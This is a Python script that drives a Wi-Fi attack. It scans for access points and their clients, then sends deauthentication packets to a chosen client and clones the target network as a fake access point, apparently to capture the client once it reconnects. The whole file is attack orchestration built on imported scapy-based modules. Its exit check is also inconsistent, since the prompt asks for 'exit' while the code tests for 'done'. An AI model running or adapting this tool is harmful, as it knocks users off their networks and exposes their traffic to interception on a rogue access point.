from curses.ascii import BS
import os
from scapy.all import get_if_list


from deauthenticate.configure.config import setMonitor, setManager
from deauthenticate.scan.sniff import clientFind, findNetwork
from deauthenticate.spoof.spoofing import setTarget
from fakeAP.duplicateAP import cloneAP



class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'



def attack():
    known={}

    print(f"list of available interfaces:\n{get_if_list()}")

    interface = wlan = input(
        bcolors.OKGREEN+"\nEnter interface name to spoof: \n \n"+bcolors.ENDC)
    setMonitor(wlan)
    try:
        print(bcolors.WARNING +
              "Press Ctrl-C to finish scanning"+bcolors.ENDC)
        known = findNetwork(interface)
        #print(known)


    except KeyboardInterrupt:
        
        print(known)
        pass

    BSSID = input(
        bcolors.OKGREEN+'\nEnter the BSSID/MAC address of the AP: \n\n'+bcolors.ENDC)
    
    channel = known[BSSID][1]
    SSID = known[BSSID][0]
    os.system("iwconfig %s channel %d" % (wlan, channel))

    print(bcolors.OKBLUE+"\nIntercepting Clients \n"+bcolors.ENDC)
    clientFind(wlan, BSSID)
    brd = input(bcolors.OKGREEN +
                   '\n\nChoose the MAC address of the client: \n\n'+bcolors.ENDC)

    print(bcolors.FAIL+'\nSending deauth packets now'+bcolors.ENDC)

    setTarget(brd, interface, BSSID)
    cloneAP(SSID,interface)
    user_input = input('To switch off the Access Point enter \"exit\"\n')
    if user_input == 'done':
        print(bcolors.BOLD+bcolors.OKGREEN+"\nDONE! " +
              bcolors.ENDC + bcolors.ENDC)  # setManagerMode(wlan)
        os.system('sudo sh fakeAP/script/closedAP.sh')
        setManager(wlan)
        print(bcolors.OKBLUE+"\n"+wlan +
              " is turned to managed mode"+bcolors.ENDC)


    



if __name__ == "__main__":
    attack()